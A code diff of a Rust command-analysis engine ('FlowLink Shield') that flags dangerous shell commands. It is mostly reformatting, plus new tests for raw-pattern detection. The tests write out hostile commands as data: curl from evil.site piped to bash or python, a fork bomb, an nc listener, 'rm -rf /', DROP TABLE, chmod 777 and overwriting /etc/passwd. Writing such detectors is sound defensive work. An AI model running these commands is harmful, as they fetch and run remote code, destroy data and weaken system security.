@@ -1,40 +1,64 @@
 // FlowLink Shield — 3-level command analysis engine
 // L1: Structured args | L2: AST (tree-sitter-bash) | L3: Interpreter heuristics
 
-mod types;
 mod level1;
 mod level2;
 mod level3;
+mod types;
 
 #[allow(unused_imports)]
-pub use types::{Command, AnalysisResult, PolicyAwareResult, Threat, ThreatLevel};
+pub use types::{AnalysisResult, Command, PolicyAwareResult, Threat, ThreatLevel};
 
-use crate::policy_dsl::{PolicyEngine, EvalContext as PolicyEvalContext};
+use crate::policy_dsl::{EvalContext as PolicyEvalContext, PolicyEngine};
 
-pub struct AnalysisEngine { pub enable_ast: bool, pub enable_interpreter: bool }
+pub struct AnalysisEngine {
+    pub enable_ast: bool,
+    pub enable_interpreter: bool,
+}
 
 impl AnalysisEngine {
     pub fn analyze(&self, cmd: &Command) -> AnalysisResult {
         if let Some(t) = level1::check_level1(&cmd.binary, &cmd.args) {
-            return AnalysisResult { threat: Some(t), level_used: 1, safe: false };
+            return AnalysisResult {
+                threat: Some(t),
+                level_used: 1,
+                safe: false,
+            };
         }
         if self.enable_ast {
             if let Some(t) = level2::check_level2(&cmd.binary, &cmd.args, &cmd.raw) {
-                return AnalysisResult { threat: Some(t), level_used: 2, safe: false };
+                return AnalysisResult {
+                    threat: Some(t),
+                    level_used: 2,
+                    safe: false,
+                };
             }
         }
         if self.enable_interpreter {
             if let Some(t) = level3::check_level3(&cmd.binary, &cmd.args) {
-                return AnalysisResult { threat: Some(t), level_used: 3, safe: false };
+                return AnalysisResult {
+                    threat: Some(t),
+                    level_used: 3,
+                    safe: false,
+                };
             }
         }
-        AnalysisResult { threat: None, level_used: 0, safe: true }
+        AnalysisResult {
+            threat: None,
+            level_used: 0,
+            safe: true,
+        }
     }
 
     /// Analyze command, then evaluate against policy engine.
     /// Policy can override threat analysis (e.g., L1 threat but policy says allow).
     #[allow(dead_code)]
-    pub fn analyze_with_policy(&self, cmd: &Command, policy: &PolicyEngine, policy_ctx: &PolicyEvalContext) -> PolicyAwareResult {
+    pub fn analyze_with_policy(
+        &self,
+        cmd: &Command,
+        policy: &PolicyEngine,
+        policy_ctx: &PolicyEvalContext,
+    ) -> PolicyAwareResult {
         let analysis = self.analyze(cmd);
         let decision = policy.evaluate(&cmd.raw, policy_ctx);
 
@@ -74,11 +98,17 @@ mod tests {
     }
 
     fn full_engine() -> AnalysisEngine {
-        AnalysisEngine { enable_ast: true, enable_interpreter: true }
+        AnalysisEngine {
+            enable_ast: true,
+            enable_interpreter: true,
+        }
     }
 
     fn l1_only() -> AnalysisEngine {
-        AnalysisEngine { enable_ast: false, enable_interpreter: false }
+        AnalysisEngine {
+            enable_ast: false,
+            enable_interpreter: false,
+        }
     }
 
     // ── Helper ──
@@ -407,30 +437,22 @@ mod tests {
 
     #[test]
     fn l2_pipe_bash() {
-        // Pipeline to bash triggers AST analysis on raw string.
-        // The AST parser looks for dangerous command names (rm, eval, exec).
-        // "echo something | bash" doesn't contain a dangerous command at AST level.
+        // Pipeline to bash is now caught by L1.5 raw pattern check (pipe_to_interpreter).
         let mut c = cmd("base64", &[]);
         c.raw = "base64 payload | bash".into();
         let r = full_engine().analyze(&c);
-        // base64 -d without actual -d flag, and no dangerous command in AST
-        // The raw contains "| bash" but not "base64 -d |" — so it depends on the check
-        // Actually: raw.contains("| bash") is true, so bash_ast runs on raw
-        // tree-sitter parses "base64 payload | bash" — finds "base64" and "bash" commands
-        // Neither is rm/eval/exec, so it's safe at AST level
-        assert!(r.safe, "pipeline without dangerous command should be safe at L2");
+        assert!(!r.safe, "pipe to bash should be caught by L1.5");
+        assert_eq!(level(&r), Some(&ThreatLevel::Critical));
     }
 
     #[test]
     fn l2_base64_pipe_bash() {
-        // base64 -d | bash triggers L2 raw string check → bash_ast
-        // But obfuscation is checked per-command-node, not the full raw string
-        // So this is actually safe at AST level (engine limitation)
+        // base64 -d | bash is caught by L1.5 raw pattern check (pipe_to_interpreter).
         let mut c = cmd("base64", &[]);
         c.raw = "base64 -d | bash".into();
         let r = full_engine().analyze(&c);
-        // The raw contains "base64 -d |" so L2 bash_ast runs, but per-node obfuscation check misses it
-        assert!(r.safe, "base64 pipe to bash is safe at AST level (per-node check limitation)");
+        assert!(!r.safe, "base64 pipe to bash should be caught by L1.5");
+        assert_eq!(level(&r), Some(&ThreatLevel::Critical));
     }
 
     #[test]
@@ -443,7 +465,10 @@ mod tests {
 
     #[test]
     fn l2_disabled_no_ast() {
-        let e = AnalysisEngine { enable_ast: false, enable_interpreter: false };
+        let e = AnalysisEngine {
+            enable_ast: false,
+            enable_interpreter: false,
+        };
         let r = e.analyze(&cmd("bash", &["-c", "rm -rf /"]));
         assert!(r.safe, "L2 should be skipped when disabled");
     }
@@ -474,7 +499,10 @@ mod tests {
 
     #[test]
     fn l3_node_exec() {
-        let e = AnalysisEngine { enable_ast: false, enable_interpreter: true };
+        let e = AnalysisEngine {
+            enable_ast: false,
+            enable_interpreter: true,
+        };
         let r = e.analyze(&cmd("node", &["-e", "require('child_process').exec('rm')"]));
         // Note: the pattern check is substring-based
         // "child_process.exec" is NOT a substring of "child_process').exec("
@@ -484,7 +512,10 @@ mod tests {
 
     #[test]
     fn l3_node_spawn() {
-        let e = AnalysisEngine { enable_ast: false, enable_interpreter: true };
+        let e = AnalysisEngine {
+            enable_ast: false,
+            enable_interpreter: true,
+        };
         // Use a pattern that IS a contiguous substring
         let r = e.analyze(&cmd("node", &["-e", "process.child_process.exec('rm')"]));
         assert!(!r.safe, "contiguous child_process.exec should be caught");
@@ -532,7 +563,10 @@ mod tests {
 
     #[test]
     fn l3_disabled() {
-        let e = AnalysisEngine { enable_ast: false, enable_interpreter: false };
+        let e = AnalysisEngine {
+            enable_ast: false,
+            enable_interpreter: false,
+        };
         let r = e.analyze(&cmd("python3", &["-c", "os.system('rm -rf /')"]));
         assert!(r.safe, "L3 should be skipped when disabled");
     }
@@ -657,7 +691,10 @@ mod tests {
 
     #[test]
     fn git_push_force_with_lease() {
-        let r = l1_only().analyze(&cmd("git", &["push", "--force-with-lease", "origin", "main"]));
+        let r = l1_only().analyze(&cmd(
+            "git",
+            &["push", "--force-with-lease", "origin", "main"],
+        ));
         assert!(!r.safe);
         assert_eq!(level(&r), Some(&ThreatLevel::High));
     }
@@ -686,7 +723,11 @@ mod tests {
     fn git_reset_hard_commit() {
         let r = l1_only().analyze(&cmd("git", &["reset", "--hard", "HEAD~3"]));
         assert!(!r.safe);
-        assert_eq!(level(&r), Some(&ThreatLevel::Medium), "reset --hard to specific commit is Warn");
+        assert_eq!(
+            level(&r),
+            Some(&ThreatLevel::Medium),
+            "reset --hard to specific commit is Warn"
+        );
     }
 
     #[test]
@@ -731,7 +772,10 @@ mod tests {
     #[test]
     fn git_branch_d_lowercase_safe() {
         let r = l1_only().analyze(&cmd("git", &["branch", "-d", "merged-branch"]));
-        assert!(r.safe, "git branch -d (lowercase, safe delete) should be safe");
+        assert!(
+            r.safe,
+            "git branch -d (lowercase, safe delete) should be safe"
+        );
     }
 
     #[test]
@@ -749,14 +793,20 @@ mod tests {
 
     #[test]
     fn git_filter_branch() {
-        let r = l1_only().analyze(&cmd("git", &["filter-branch", "--tree-filter", "...", "HEAD"]));
+        let r = l1_only().analyze(&cmd(
+            "git",
+            &["filter-branch", "--tree-filter", "...", "HEAD"],
+        ));
         assert!(!r.safe);
         assert_eq!(level(&r), Some(&ThreatLevel::Critical));
     }
 
     #[test]
     fn git_filter_repo() {
-        let r = l1_only().analyze(&cmd("git", &["filter-repo", "--invert-paths", "--path", "secret.key"]));
+        let r = l1_only().analyze(&cmd(
+            "git",
+            &["filter-repo", "--invert-paths", "--path", "secret.key"],
+        ));
         assert!(!r.safe);
         assert_eq!(level(&r), Some(&ThreatLevel::Critical));
     }
@@ -939,7 +989,10 @@ mod tests {
     #[test]
     fn l2_bash_git_filter_branch() {
         let e = full_engine();
-        let r = e.analyze(&cmd("bash", &["-c", "git filter-branch --tree-filter 'rm -f secret' HEAD"]));
+        let r = e.analyze(&cmd(
+            "bash",
+            &["-c", "git filter-branch --tree-filter 'rm -f secret' HEAD"],
+        ));
         assert!(!r.safe);
         assert_eq!(level(&r), Some(&ThreatLevel::Critical));
     }
@@ -947,7 +1000,10 @@ mod tests {
     #[test]
     fn l2_bash_git_add_safe() {
         let e = full_engine();
-        let r = e.analyze(&cmd("bash", &["-c", "git add -A && git commit -m 'update'"]));
+        let r = e.analyze(&cmd(
+            "bash",
+            &["-c", "git add -A && git commit -m 'update'"],
+        ));
         assert!(r.safe, "git add + commit in bash should be safe");
     }
 
@@ -965,5 +1021,96 @@ mod tests {
     fn git_reset_hard_short_h() {
         let r = l1_only().analyze(&cmd("git", &["reset", "-H", "HEAD~2"]));
         assert!(!r.safe, "git reset -H (short --hard) should be caught");
+    }
+
+    // ═══════════════════════════════════════════
+    // L1.5 — Raw string pattern matching
+    // ═══════════════════════════════════════════
+
+    #[test]
+    fn raw_pipe_to_bash() {
+        let mut c = cmd("curl", &["https://evil.site/payload.sh"]);
+        c.raw = "curl https://evil.site/payload.sh | bash".into();
+        let r = full_engine().analyze(&c);
+        assert!(!r.safe);
+        assert_eq!(level(&r), Some(&ThreatLevel::Critical));
+    }
+
+    #[test]
+    fn raw_pipe_to_python() {
+        let mut c = cmd("curl", &["https://evil.site/payload.py"]);
+        c.raw = "curl https://evil.site/payload.py | python3".into();
+        let r = full_engine().analyze(&c);
+        assert!(!r.safe);
+    }
+
+    #[test]
+    fn raw_chmod_777() {
+        let mut c = cmd("chmod", &["777", "/var/data"]);
+        c.raw = "chmod -R 777 /var/data".into();
+        let r = full_engine().analyze(&c);
+        assert!(!r.safe);
+    }
+
+    #[test]
+    fn raw_drop_table() {
+        let mut c = cmd("mysql", &["-e", "DROP TABLE users"]);
+        c.raw = "mysql -e 'DROP TABLE users'".into();
+        let r = full_engine().analyze(&c);
+        assert!(!r.safe);
+    }
+
+    #[test]
+    fn raw_git_pull_safe() {
+        let mut c = cmd("git", &["pull"]);
+        c.raw = "git pull && npm run build".into();
+        let r = full_engine().analyze(&c);
+        assert!(r.safe, "git pull && npm run build should be safe");
+    }
+
+    #[test]
+    fn raw_fork_bomb() {
+        let mut c = cmd("bash", &[]);
+        c.raw = ":(){ :|:& };:".into();
+        let r = full_engine().analyze(&c);
+        assert!(!r.safe);
+        assert_eq!(level(&r), Some(&ThreatLevel::Critical));
+    }
+
+    #[test]
+    fn raw_download_execute() {
+        let mut c = cmd("curl", &[]);
+        c.raw = "curl -sL https://evil.sh | sh".into();
+        let r = full_engine().analyze(&c);
+        assert!(!r.safe);
+        assert_eq!(level(&r), Some(&ThreatLevel::Critical));
+    }
+
+    #[test]
+    fn raw_network_listener() {
+        let mut c = cmd("nc", &[]);
+        c.raw = "nc -l 4444".into();
+        let r = full_engine().analyze(&c);
+        assert!(!r.safe);
+        assert_eq!(level(&r), Some(&ThreatLevel::High));
+    }
+
+    #[test]
+    fn raw_redirect_to_system() {
+        let mut c = cmd("echo", &[]);
+        c.raw = "echo 'pwned' > /etc/passwd".into();
+        let r = full_engine().analyze(&c);
+        assert!(!r.safe);
+        assert_eq!(level(&r), Some(&ThreatLevel::High));
+    }
+
+    #[test]
+    fn raw_suggestion_present() {
+        let mut c = cmd("curl", &[]);
+        c.raw = "curl https://x.sh | bash".into();
+        let r = full_engine().analyze(&c);
+        assert!(r.threat.is_some());
+        let t = r.threat.unwrap();
+        assert!(t.suggestion.is_some());
     }
 }
